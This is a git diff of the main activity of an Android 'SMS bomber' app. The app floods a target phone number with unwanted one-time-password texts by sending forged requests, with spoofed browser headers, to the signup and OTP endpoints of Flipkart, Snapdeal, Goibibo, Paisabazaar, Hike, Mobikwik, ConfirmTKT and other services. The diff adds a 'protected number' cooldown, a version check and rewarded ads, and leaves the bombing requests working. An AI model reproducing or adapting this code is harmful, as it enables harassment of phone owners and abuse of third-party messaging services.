@@ -3,6 +3,8 @@ package co.deucate.smsbomber;
 import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -11,7 +13,9 @@ import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Handler;
 import android.provider.ContactsContract;
+import android.support.annotation.NonNull;
 import android.support.v7.app.AppCompatActivity;
+import android.support.v7.widget.RecyclerView;
 import android.text.Html;
 import android.text.TextUtils;
 import android.view.Menu;
@@ -24,6 +28,7 @@ import android.widget.EditText;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 
+import com.awesomedialog.blennersilva.awesomedialoglibrary.AwesomeErrorDialog;
 import com.awesomedialog.blennersilva.awesomedialoglibrary.AwesomeNoticeDialog;
 import com.awesomedialog.blennersilva.awesomedialoglibrary.interfaces.Closure;
 import com.google.android.gms.ads.AdListener;
@@ -31,10 +36,21 @@ import com.google.android.gms.ads.AdRequest;
 import com.google.android.gms.ads.AdView;
 import com.google.android.gms.ads.InterstitialAd;
 import com.google.android.gms.ads.MobileAds;
+import com.google.android.gms.ads.reward.RewardItem;
+import com.google.android.gms.ads.reward.RewardedVideoAd;
+import com.google.android.gms.ads.reward.RewardedVideoAdListener;
+import com.google.android.gms.tasks.OnCompleteListener;
+import com.google.android.gms.tasks.Task;
+import com.google.firebase.firestore.DocumentSnapshot;
+import com.google.firebase.firestore.FirebaseFirestore;
 
+import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.IOException;
+import java.text.ParseException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.HashMap;
 
 import okhttp3.Call;
@@ -45,23 +61,26 @@ import okhttp3.Request;
 import okhttp3.RequestBody;
 import okhttp3.Response;
 
-
 @SuppressWarnings("ALL")
-public class HomeActivity extends AppCompatActivity {
+public class HomeActivity extends AppCompatActivity implements RewardedVideoAdListener {
 
     private static final String TAG = "HomeActivity";
     private static final int REQUEST_CONTACT_NUMBER = 32;
     String mPhoneNumber, mLog;
+    RecyclerView mRecyclerView;
     EditText mPhoneEt;
-    TextView mStatusTV, mLogTV;
+    TextView mStatusTV;
     LinearLayout mPhoneLayout;
     AdRequest adRequest;
+
 
     private InterstitialAd interstitialAd;
 
     Thread mThread;
+    Date cuttuntTime = null;
+    int a, current, latest;
 
-    int a;
+    private RewardedVideoAd mRewardedVideoAd;
 
 
     @Override
@@ -73,6 +92,18 @@ public class HomeActivity extends AppCompatActivity {
             addLog("#FF0000", "Please connect to network");
             return;
         }
+
+        mRewardedVideoAd = MobileAds.getRewardedVideoAdInstance(this);
+        mRewardedVideoAd.setRewardedVideoAdListener(this);
+
+        try {
+            PackageInfo pInfo = this.getPackageManager().getPackageInfo(getPackageName(), 0);
+            current = pInfo.versionCode;
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
+        }
+
+        getLatestVersion();
 
         adRequest = new AdRequest.Builder().build();
 
@@ -87,7 +118,7 @@ public class HomeActivity extends AppCompatActivity {
                     interstitialAd.loadAd(adRequest);
                 }
             }
-        }, 30000);
+        }, 60000);
 
         new AwesomeNoticeDialog(this)
                 .setTitle("Warning")
@@ -110,23 +141,18 @@ public class HomeActivity extends AppCompatActivity {
         AdRequest adRequest1 = new AdRequest.Builder().build();
         adView.loadAd(adRequest1);
 
-        AdView adView1 = findViewById(R.id.mainTopBannerAd);
-        AdRequest adRequest2 = new AdRequest.Builder().build();
-        adView.loadAd(adRequest2);
-
         MobileAds.initialize(this, "ca-app-pub-8086732239748075~8890173650");
 
         interstitialAd = new InterstitialAd(this);
         interstitialAd.setAdUnitId("ca-app-pub-8086732239748075/9598708915");
         interstitialAd.loadAd(new AdRequest.Builder().build());
 
-
         mPhoneEt = findViewById(R.id.mainPhoneEt);
         mPhoneLayout = findViewById(R.id.linearLayout);
         mStatusTV = findViewById(R.id.mainStatus);
-        mLogTV = findViewById(R.id.logTV);
+        mRecyclerView = findViewById(R.id.mainRecyclerView);
 
-        mLog = mLogTV.getText().toString();
+//        mLog = mLogTV.getText().toString();
 
         findViewById(R.id.mainOkBtn).setOnClickListener(new View.OnClickListener() {
             @Override
@@ -138,7 +164,6 @@ public class HomeActivity extends AppCompatActivity {
                     return;
                 }
 
-
                 if (!isNetworkAvailable()) {
                     addLog("#FF0000", "Please connect to network");
                     return;
@@ -146,7 +171,6 @@ public class HomeActivity extends AppCompatActivity {
 
                 if (interstitialAd.isLoaded()) {
                     interstitialAd.show();
-                    interstitialAd.loadAd(adRequest);
                 } else {
                     addLog("#FFFF33", "Please wait 10-15 second. Server is busy.");
                     interstitialAd.loadAd(adRequest);
@@ -157,8 +181,8 @@ public class HomeActivity extends AppCompatActivity {
                     addLog("#FF0000", "Bombing on creator of this app does not make sense.");
                     return;
                 }
-
-                new Bomb().execute();
+                getCurrentTime();
+                isProtectedNumber();
 
             }
         });
@@ -185,7 +209,8 @@ public class HomeActivity extends AppCompatActivity {
 
             @Override
             public void onAdFailedToLoad(int errorCode) {
-                addLog("#FF0000", "Error : " + errorCode);
+                addLog("#FF0000", "Errorcode : " + errorCode);
+                interstitialAd.loadAd(adRequest);
             }
 
             @Override
@@ -208,6 +233,134 @@ public class HomeActivity extends AppCompatActivity {
 
     }
 
+    private void isProtectedNumber() {
+
+        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
+        firestore.collection("Protected").document(mPhoneNumber).get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
+            @Override
+            public void onComplete(@NonNull Task<DocumentSnapshot> task) {
+                DocumentSnapshot snapshot = task.getResult();
+                if (snapshot.exists()) {
+
+                    String timeString = snapshot.getString("Time");
+                    timeString = timeString.replace("T", " ");
+                    timeString = timeString.replace("Z", " ");
+
+                    SimpleDateFormat dateFormat2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:SS.SSS");
+
+                    try {
+                        Date temp = dateFormat2.parse(timeString);
+
+                        long difference = temp.getTime() - cuttuntTime.getTime();
+                        long days = (int) (difference / (1000 * 60 * 60 * 24));
+                        long hours = (int) ((difference - (1000 * 60 * 60 * 24 * days)) / (1000 * 60 * 60));
+                        long min = (int) (difference - (1000 * 60 * 60 * 24 * days) - (1000 * 60 * 60 * hours)) / (1000 * 60);
+                        hours = (hours < 0 ? -hours : hours);
+
+                        if (hours >= 3) {
+                            new Bomb().execute();
+                        } else {
+                            addLog("#FF0000", "This number is protected please tray again after some while.");
+                        }
+                    } catch (ParseException e) {
+                        e.printStackTrace();
+                    } catch (NullPointerException e) {
+                        e.printStackTrace();
+                    }
+
+
+                } else {
+                    new Bomb().execute();
+                }
+            }
+        });
+    }
+
+    private void getCurrentTime() {
+        OkHttpClient client = new OkHttpClient();
+        Request request = new Request.Builder().url("https://us-central1-smsbomber-e784b.cloudfunctions.net/Time").build();
+
+        Call call = client.newCall(request);
+        call.enqueue(new Callback() {
+            @Override
+            public void onFailure(@NonNull Call call, @NonNull IOException e) {
+            }
+
+            @Override
+            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
+
+                //noinspection ConstantConditions
+                String JSONData = response.body().string();
+                HashMap<String, Object> data = new HashMap<>();
+
+                try {
+                    JSONObject root = new JSONObject(JSONData);
+                    String timeString = root.getString("Time");
+
+                    timeString = timeString.replace("T", " ");
+                    timeString = timeString.replace("Z", " ");
+
+                    SimpleDateFormat dateFormat2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:SS.SSS");
+
+                    Date temp = dateFormat2.parse(timeString);
+
+                    cuttuntTime = temp;
+
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                } catch (ParseException e) {
+                    e.printStackTrace();
+                }
+
+            }
+        });
+    }
+
+    private void loadRewardedVideoAd() {
+        mRewardedVideoAd.loadAd("ca-app-pub-8086732239748075/7406638658", new AdRequest.Builder().build());
+    }
+
+    private void getLatestVersion() {
+
+        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
+
+        firestore.collection("Current").document("version").get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
+            @Override
+            public void onComplete(@NonNull Task<DocumentSnapshot> task) {
+                if (task.isSuccessful()) {
+                    DocumentSnapshot snapshot = task.getResult();
+                    latest = Integer.parseInt(snapshot.getString("v"));
+
+                    if (current != latest) {
+                        showErrorDialog();
+                    }
+
+                }
+            }
+        });
+
+    }
+
+    private void showErrorDialog() {
+
+        new AwesomeErrorDialog(this)
+                .setTitle(R.string.app_name)
+                .setMessage("Your app is not up to date please update you app to get latest feature.")
+                .setColoredCircle(R.color.dialogErrorBackgroundColor)
+                .setDialogIconAndColor(R.drawable.ic_dialog_error, R.color.white)
+                .setCancelable(true).setButtonText(getString(R.string.dialog_ok_button))
+                .setButtonBackgroundColor(R.color.dialogErrorBackgroundColor)
+                .setButtonText(getString(R.string.dialog_ok_button))
+                .setErrorButtonClick(new Closure() {
+                    @Override
+                    public void exec() {
+                        Intent intent = new Intent(Intent.ACTION_VIEW);
+                        intent.setData(Uri.parse("https://smsbomber.deucate.com/others/latest.apk"));
+                    }
+                })
+                .show();
+    }
+
     private boolean isDeveloperNumber(String phoneNumber) {
 
         phoneNumber = phoneNumber.replace(" ", "");
@@ -222,6 +375,41 @@ public class HomeActivity extends AppCompatActivity {
         }
 
         return true;
+    }
+
+    @Override
+    public void onRewardedVideoAdLoaded() {
+        mRewardedVideoAd.show();
+    }
+
+    @Override
+    public void onRewardedVideoAdOpened() {
+
+    }
+
+    @Override
+    public void onRewardedVideoStarted() {
+
+    }
+
+    @Override
+    public void onRewardedVideoAdClosed() {
+    }
+
+    @Override
+    public void onRewarded(RewardItem rewardItem) {
+    }
+
+    @Override
+    public void onRewardedVideoAdLeftApplication() {
+    }
+
+    @Override
+    public void onRewardedVideoAdFailedToLoad(int i) {
+    }
+
+    @Override
+    public void onRewardedVideoCompleted() {
     }
 
 
@@ -270,10 +458,11 @@ public class HomeActivity extends AppCompatActivity {
         RequestBody localRequestBody = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "loginId=%2B91" + mPhoneNumber);
         localOkHttpClient.newCall(new Request.Builder().url("https://www.flipkart.com/api/5/user/otp/generate").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "21").addHeader("cookie", mPhoneNumber).addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
             public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+
             }
 
             public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
-                mStatusTV.setText("Flipkart");
+                updateStatus("Flipkart");
             }
         });
     }
@@ -283,10 +472,11 @@ public class HomeActivity extends AppCompatActivity {
         RequestBody localRequestBody1 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "submit=submit&identity=" + mPhoneNumber + "&otpType=SIGNUP_OTP");
         localOkHttpClient1.newCall(new Request.Builder().url("https://mbe.homeshop18.com/services/secure/user/generate/otp").post(localRequestBody1).addHeader("x-hs18-app-version", "3.1.0").addHeader("x-hs18-app-id", "0").addHeader("x-hs18-device-version", "25").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("accept-charset", "UTF-8").addHeader("x-hs18-app-platform", "androidApp").build()).enqueue(new Callback() {
             public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+
             }
 
             public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
-                mStatusTV.setText("Homeshop18");
+                updateStatus("Homeshop18");
             }
         });
     }
@@ -302,10 +492,11 @@ public class HomeActivity extends AppCompatActivity {
                 .addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest")
                 .addHeader("content-length", "62").addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
             public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+
             }
 
             public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
-                mStatusTV.setText("Snapdeal");
+                updateStatus("Snapdeal");
             }
         });
     }
@@ -315,15 +506,11 @@ public class HomeActivity extends AppCompatActivity {
         RequestBody localRequestBody3 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=" + mPhoneNumber);
         localOkHttpClient3.newCall(new Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody3).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(new Callback() {
             public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+
             }
 
             public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
-                runOnUiThread(new Runnable() {
-                    @Override
-                    public void run() {
-                        mStatusTV.setText("Goibibo");
-                    }
-                });
+                updateStatus("Goibibo");
             }
         });
     }
@@ -333,10 +520,11 @@ public class HomeActivity extends AppCompatActivity {
         RequestBody localRequestBody11 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mobile_number=" + mPhoneNumber + "&step=send_password&request_page=landing");
         localOkHttpClient11.newCall(new Request.Builder().url("https://myaccount.paisabazaar.com/my-account/").post(localRequestBody11).addHeader("host", "myaccount.paisabazaar.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "application/json, text/javascript, */*; q=0.01").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://myaccount.paisabazaar.com/my-account/").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest").addHeader("content-length", "64").addHeader("connection", "keep-alive").build()).enqueue(new Callback() {
             public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+
             }
 
             public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
-                mStatusTV.setText("Paisabazar");
+                updateStatus("Paisabazaar");
             }
         });
     }
@@ -348,12 +536,8 @@ public class HomeActivity extends AppCompatActivity {
             }
 
             public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
-                runOnUiThread(new Runnable() {
-                    @Override
-                    public void run() {
-                        mStatusTV.setText("Justdial");
-                    }
-                });
+                updateStatus("Justdial");
+
             }
         });
     }
@@ -368,10 +552,11 @@ public class HomeActivity extends AppCompatActivity {
         RequestBody localRequestBody121 = RequestBody.create(localMediaType0, localJSONObject121.toString());
         localOkHttpClient121.newCall(new Request.Builder().url("http://api.im.hike.in/v3/account/validate?digits=4").post(localRequestBody121).addHeader("content-type", "application/json; charset=utf-8").build()).enqueue(new Callback() {
             public void onFailure(Call paramAnonymousCall, IOException paramAnonymousIOException) {
+
             }
 
             public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
-                mStatusTV.setText("Hike");
+                updateStatus("Hike");
             }
         });
     }
@@ -388,7 +573,7 @@ public class HomeActivity extends AppCompatActivity {
             }
 
             public void onResponse(Call paramAnonymousCall, Response paramAnonymousResponse) {
-                mStatusTV.setText("Mobikwik");
+                updateStatus("MobiKWICK");
             }
         });
     }
@@ -400,11 +585,19 @@ public class HomeActivity extends AppCompatActivity {
                 WebView webView = new WebView(HomeActivity.this);
                 webView.loadUrl("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + mPhoneNumber);
                 webView.setWebViewClient(new WebViewClient());
-                mStatusTV.setText("ConfirmTKT");
+                updateStatus("ConfirmTKT");
             }
         });
     }
 
+    private void updateStatus(final String s) {
+        runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                mStatusTV.setText(s);
+            }
+        });
+    }
 
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
@@ -427,6 +620,11 @@ public class HomeActivity extends AppCompatActivity {
                 Intent intent = new Intent(Intent.ACTION_VIEW);
                 intent.setData(Uri.parse("https://deucate.com/"));
                 startActivity(intent);
+                return true;
+            }
+
+            case R.id.menuProtect: {
+                startActivity(new Intent(HomeActivity.this, ProtectedActivity.class));
                 return true;
             }
 
@@ -492,9 +690,29 @@ public class HomeActivity extends AppCompatActivity {
     }
 
     private void addLog(String color, String log) {
+        String oldData = log;
+
         String newLog = "<font color='" + color + "'>" + log + "</font>";
         mLog += "<br/>> " + newLog;
-        mLogTV.setText(Html.fromHtml(mLog));
+        //mLogTV.setText(Html.fromHtml(mLog));
+    }
+
+    @Override
+    public void onResume() {
+        mRewardedVideoAd.resume(this);
+        super.onResume();
+    }
+
+    @Override
+    public void onPause() {
+        mRewardedVideoAd.pause(this);
+        super.onPause();
+    }
+
+    @Override
+    public void onDestroy() {
+        mRewardedVideoAd.destroy(this);
+        super.onDestroy();
     }
 
 }
